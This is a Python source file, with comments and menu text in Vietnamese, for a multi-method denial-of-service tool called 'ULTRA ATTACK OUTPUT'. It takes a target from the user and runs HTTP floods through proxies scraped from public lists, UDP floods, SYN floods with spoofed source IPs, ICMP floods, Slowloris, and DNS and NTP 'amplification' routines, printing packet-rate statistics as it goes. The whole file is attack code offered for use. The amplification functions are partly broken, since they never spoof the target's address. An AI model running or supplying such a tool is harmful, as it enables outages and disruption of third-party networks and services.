#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#   ULTRA_ATTACK_OUTPUT.py – Code tấn công đa tầng + output chi tiết
#   Hiển thị số gói gửi, tốc độ, lỗi, proxy, trạng thái theo thời gian thực.
#   Chạy trên Windows/Linux, có/không Admin.
#   Cách chạy: python ULTRA_ATTACK_OUTPUT.py (với Admin nếu dùng SYN)
#

import os
import sys
import time
import socket
import struct
import threading
import random
import subprocess
import platform
import requests
from concurrent.futures import ThreadPoolExecutor

# ==================== BIẾN TOÀN CỤC ĐẾM ============================
sent_packets = 0
error_packets = 0
packet_lock = threading.Lock()

# ==================== KIỂM TRA QUYỀN ADMIN ===========================
def is_admin():
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

ADMIN = is_admin()
if not ADMIN:
    print("[!] Không có quyền Admin. SYN flood bị vô hiệu.\n")
else:
    print("[+] Đã có Admin. SYN flood sẵn sàng.\n")

# ==================== CẤU HÌNH TOÀN CỤC =============================
TARGET_IP = ""
TARGET_PORT = 80
THREADS = 200
DURATION = 60
METHOD = "all"
USE_PROXY = True
PROXY_LIST = []
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP.txt"
]

# ==================== HÀM LẤY PROXY =================================
def fetch_proxies():
    proxies = set()
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        if not line.startswith('http'):
                            line = f"http://{line}"
                        proxies.add(line)
        except:
            pass
    return list(proxies)

# ==================== CÁC HÀM TẤN CÔNG (CÓ ĐẾM) ===================
def count_packet(success=True):
    global sent_packets, error_packets
    with packet_lock:
        if success:
            sent_packets += 1
        else:
            error_packets += 1

def http_flood(target_ip, target_port, proxy=None, duration=10):
    url = f"http://{target_ip}:{target_port}/"
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]),
        'Cache-Control': 'no-cache',
        'Accept': '*/*'
    }
    proxies = {'http': proxy, 'https': proxy} if proxy else None
    start = time.time()
    while time.time() - start < duration:
        try:
            requests.get(url, headers=headers, proxies=proxies, timeout=2)
            count_packet(True)
            requests.post(url, headers=headers, data={'x': random.randint(1,9999)}, proxies=proxies, timeout=2)
            count_packet(True)
        except:
            count_packet(False)

def udp_flood(target_ip, target_port, duration=10):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1400)
    start = time.time()
    while time.time() - start < duration:
        try:
            sock.sendto(data, (target_ip, target_port))
            count_packet(True)
        except:
            count_packet(False)
    sock.close()

def syn_flood(target_ip, target_port, duration=10):
    if not ADMIN:
        udp_flood(target_ip, target_port, duration)
        return
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        start = time.time()
        while time.time() - start < duration:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            ip_header = struct.pack('!BBHHHBBH4s4s',
                69, 0, 40, random.randint(0,65535), 0, 255, 6, 0,
                socket.inet_aton(src_ip), socket.inet_aton(target_ip))
            tcp_header = struct.pack('!HHLLBBHHH',
                random.randint(1024,65535), target_port,
                random.randint(0,2**32-1), 0, 80, 2, 65535, 0, 0)
            packet = ip_header + tcp_header
            sock.sendto(packet, (target_ip, 0))
            count_packet(True)
        sock.close()
    except:
        count_packet(False)
        udp_flood(target_ip, target_port, duration)

def icmp_flood(target_ip, duration=10):
    if platform.system() == 'Windows':
        cmd = f"ping -n 100000 -l 65500 {target_ip}"
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        start = time.time()
        while time.time() - start < duration:
            count_packet(True)
            time.sleep(0.01)
        subprocess.call("taskkill /F /IM ping.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        cmd = f"ping -f -s 65500 {target_ip}"
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        start = time.time()
        while time.time() - start < duration:
            count_packet(True)
            time.sleep(0.01)
        subprocess.call("pkill -f ping", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def slowloris(target_ip, target_port, duration=10):
    sockets = []
    start = time.time()
    while time.time() - start < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(b"Host: %s\r\n" % target_ip.encode())
            sock.send(b"User-Agent: Mozilla/5.0\r\n")
            sockets.append(sock)
            count_packet(True)
            time.sleep(0.1)
        except:
            count_packet(False)
    time.sleep(duration)
    for s in sockets:
        try: s.close()
        except: pass

def dns_amp(target_ip, duration=10):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    domain = 'isc.org'
    q = struct.pack('!HHHHHH', random.randint(0,65535), 0x0100, 1, 0, 0, 0)
    for part in domain.split('.'):
        q += bytes([len(part)]) + part.encode()
    q += b'\x00' + struct.pack('!HH', 1, 1)
    dns_servers = ['8.8.8.8','1.1.1.1','8.8.4.4','1.0.0.1','9.9.9.9']
    start = time.time()
    while time.time() - start < duration:
        try:
            server = random.choice(dns_servers)
            sock.sendto(q, (server, 53))
            count_packet(True)
        except:
            count_packet(False)
    sock.close()

def ntp_amp(target_ip, duration=10):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    q = b'\x17\x00\x03\x2a' + b'\x00'*4 + b'\x00'*212
    ntp_servers = ['0.pool.ntp.org','1.pool.ntp.org','2.pool.ntp.org','3.pool.ntp.org']
    start = time.time()
    while time.time() - start < duration:
        try:
            server = random.choice(ntp_servers)
            sock.sendto(q, (server, 123))
            count_packet(True)
        except:
            count_packet(False)
    sock.close()

# ==================== LUỒNG TẤN CÔNG ===============================
def worker(target_ip, target_port, method, proxy=None, duration=10):
    if method == 'http':
        http_flood(target_ip, target_port, proxy, duration)
    elif method == 'udp':
        udp_flood(target_ip, target_port, duration)
    elif method == 'syn':
        syn_flood(target_ip, target_port, duration)
    elif method == 'icmp':
        icmp_flood(target_ip, duration)
    elif method == 'slow':
        slowloris(target_ip, target_port, duration)
    elif method == 'dns':
        dns_amp(target_ip, duration)
    elif method == 'ntp':
        ntp_amp(target_ip, duration)

# ==================== OUTPUT THỐNG KÊ ==============================
def stats_loop(duration):
    global sent_packets, error_packets
    start_time = time.time()
    last_sent = 0
    last_time = start_time
    print("\n" + "="*60)
    print(f"{'Thời gian':<12} {'Gửi thành công':<18} {'Lỗi':<10} {'Tốc độ (pps)':<15} {'Proxy đang dùng'}")
    print("="*60)
    while time.time() - start_time < duration:
        time.sleep(3)
        now = time.time()
        elapsed = now - start_time
        with packet_lock:
            s = sent_packets
            e = error_packets
        pps = (s - last_sent) / (now - last_time) if (now - last_time) > 0 else 0
        last_sent = s
        last_time = now
        proxy_count = len(PROXY_LIST) if USE_PROXY and PROXY_LIST else 0
        print(f"{int(elapsed):<6}s     {s:<18,} {e:<10,} {pps:<15,.0f} {proxy_count:<10}")
    print("="*60)

# ==================== MENU ==========================================
def menu():
    global TARGET_IP, TARGET_PORT, THREADS, DURATION, METHOD, USE_PROXY, PROXY_LIST
    print(r"""
╔═════════════════════════════════════════════════════════════╗
║   ULTRA ATTACK OUTPUT – SIÊU TẤN CÔNG + THỐNG KÊ          ║
║   (c) palofsc – Dành cho Windows/Linux                    ║
║   Trạng thái Admin: """ + ("✅ CÓ" if ADMIN else "❌ KHÔNG") + """                          ║
╚═════════════════════════════════════════════════════════════╝
    """)
    target_input = input("IP hoặc domain mục tiêu: ").strip()
    if not target_input:
        print("[!] Không được để trống.")
        return False
    try:
        TARGET_IP = socket.gethostbyname(target_input)
        print(f"[+] Phân giải: {target_input} -> {TARGET_IP}")
    except:
        TARGET_IP = target_input
        print(f"[*] Dùng IP: {TARGET_IP}")

    TARGET_PORT = int(input("Cổng (mặc định 80): ") or "80")
    THREADS = int(input("Số luồng (mặc định 200, tối đa 500): ") or "200")
    if THREADS > 500:
        THREADS = 500
    DURATION = int(input("Thời gian (giây, mặc định 60): ") or "60")

    print("\nChọn phương thức tấn công:")
    print("1. HTTP flood (có proxy)")
    print("2. UDP flood")
    print("3. SYN flood (cần Admin)")
    print("4. ICMP flood (ping)")
    print("5. Slowloris (giữ kết nối)")
    print("6. DNS amplification")
    print("7. NTP amplification")
    print("8. TẤT CẢ (kết hợp 7 loại)")

    method_choice = input("Nhập số (mặc định 8): ").strip() or "8"
    method_map = {'1':'http','2':'udp','3':'syn','4':'icmp','5':'slow','6':'dns','7':'ntp','8':'all'}
    METHOD = method_map.get(method_choice, 'all')

    USE_PROXY = input("Dùng proxy cho HTTP? (y/n, mặc định y): ").strip().lower() != 'n'
    if USE_PROXY:
        proxy_input = input("Nhập proxy thủ công (ip:port, cách nhau dấu phẩy) hoặc để trống lấy tự động: ").strip()
        if proxy_input:
            PROXY_LIST = [f"http://{p.strip()}" if not p.startswith('http') else p.strip() for p in proxy_input.split(',') if p.strip()]
        else:
            print("[*] Đang lấy proxy tự động...")
            PROXY_LIST = fetch_proxies()
            if not PROXY_LIST:
                print("[!] Không lấy được proxy, sẽ tấn công không proxy.")
                USE_PROXY = False
            else:
                print(f"[+] Lấy được {len(PROXY_LIST)} proxy.")
    return True

# ==================== KHỞI ĐỘNG TẤN CÔNG ===========================
def start_attack():
    print(f"\n[*] Bắt đầu tấn công {TARGET_IP}:{TARGET_PORT} với {THREADS} luồng, thời gian {DURATION}s.")
    if METHOD == 'all':
        methods = ['http','udp','syn','icmp','slow','dns','ntp']
        method_list = []
        for m in methods:
            method_list.extend([m] * (THREADS // len(methods)))
        while len(method_list) < THREADS:
            method_list.append(random.choice(methods))
        random.shuffle(method_list)
    else:
        method_list = [METHOD] * THREADS

    proxy_iter = iter(PROXY_LIST) if USE_PROXY and PROXY_LIST else None
    threads = []
    for method in method_list:
        proxy = None
        if proxy_iter and method == 'http':
            try:
                proxy = next(proxy_iter)
            except StopIteration:
                proxy_iter = iter(PROXY_LIST)
                proxy = next(proxy_iter)
        t = threading.Thread(target=worker, args=(TARGET_IP, TARGET_PORT, method, proxy, DURATION))
        t.daemon = True
        t.start()
        threads.append(t)

    # Chạy luồng thống kê
    stats_thread = threading.Thread(target=stats_loop, args=(DURATION,))
    stats_thread.daemon = True
    stats_thread.start()

    print("[*] Đang chạy... Nhấn Ctrl+C để dừng sớm.\n")
    try:
        time.sleep(DURATION)
    except KeyboardInterrupt:
        print("\n[*] Người dùng dừng.")
    print("[+] Kết thúc tấn công.")

# ==================== CHẠY CHƯƠNG TRÌNH ===========================
if __name__ == "__main__":
    if menu():
        start_attack()
    else:
        print("[!] Lỗi cấu hình.")
